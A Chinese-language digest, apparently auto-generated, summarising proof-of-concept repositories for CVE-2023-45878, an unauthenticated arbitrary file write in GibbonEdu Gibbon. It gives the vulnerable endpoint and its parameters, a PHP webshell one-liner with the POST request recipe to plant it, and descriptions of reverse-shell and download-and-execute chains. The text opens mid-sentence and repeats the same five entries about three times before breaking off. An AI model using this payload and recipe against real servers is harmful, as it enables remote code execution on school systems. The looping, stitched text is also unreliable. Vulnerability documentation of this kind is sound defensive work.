尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

